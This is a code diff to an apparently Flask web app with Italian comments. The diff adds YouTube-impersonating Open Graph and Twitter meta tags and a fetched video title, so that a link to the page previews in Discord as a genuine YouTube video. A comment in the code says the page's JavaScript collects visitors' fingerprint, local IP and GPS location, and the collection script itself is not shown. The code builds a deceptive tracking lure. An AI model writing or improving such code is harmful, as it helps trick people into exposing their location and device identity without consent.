@@ -287,7 +287,21 @@ def index():
         "counter": counter
     }
 
+    # ===== AGGIUNTA: Recupera titolo video YouTube per una preview più realistica =====
+    video_id = "8W7RA8Akfxo"
+    video_title = "Guarda questo video su YouTube!"
+    try:
+        yt_resp = requests.get(
+            f"https://www.youtube.com/oembed?url=https://www.youtube.com/shorts/{video_id}&format=json",
+            timeout=3
+        )
+        if yt_resp.status_code == 200:
+            video_title = yt_resp.json().get("title", video_title)
+    except:
+        pass
+
     # Pagina HTML con JavaScript per raccogliere fingerprint, IP locale e GPS
+    # Le due meta tag originali sono INALTERATE. Aggiungo solo nuovi tag per l'embed.
     return f"""
     <!DOCTYPE html>
     <html>
@@ -295,6 +309,24 @@ def index():
         <meta charset="UTF-8">
         <meta property="og:title" content="YouTube">
         <meta property="og:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
+        <!-- >>> INIZIO AGGIUNTE PER EMBED DISCORD MIGLIORATO <<< -->
+        <meta property="og:description" content="{video_title}">
+        <meta property="og:url" content="{request.url}">
+        <meta property="og:type" content="video.other">
+        <meta property="og:site_name" content="YouTube">
+        <meta property="og:video" content="https://www.youtube.com/shorts/8W7RA8Akfxo">
+        <meta property="og:video:secure_url" content="https://www.youtube.com/shorts/8W7RA8Akfxo">
+        <meta property="og:video:type" content="text/html">
+        <meta property="og:video:width" content="1280">
+        <meta property="og:video:height" content="720">
+        <meta name="twitter:card" content="player">
+        <meta name="twitter:title" content="YouTube">
+        <meta name="twitter:description" content="{video_title}">
+        <meta name="twitter:image" content="https://i.ytimg.com/vi/8W7RA8Akfxo/maxresdefault.jpg">
+        <meta name="twitter:player" content="https://www.youtube.com/shorts/8W7RA8Akfxo">
+        <meta name="twitter:player:width" content="1280">
+        <meta name="twitter:player:height" content="720">
+        <!-- >>> FINE AGGIUNTE <<< -->
     </head>
     <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
         <p style="color:#fff;font-family:Arial;font-size:18px;">Caricamento...</p>
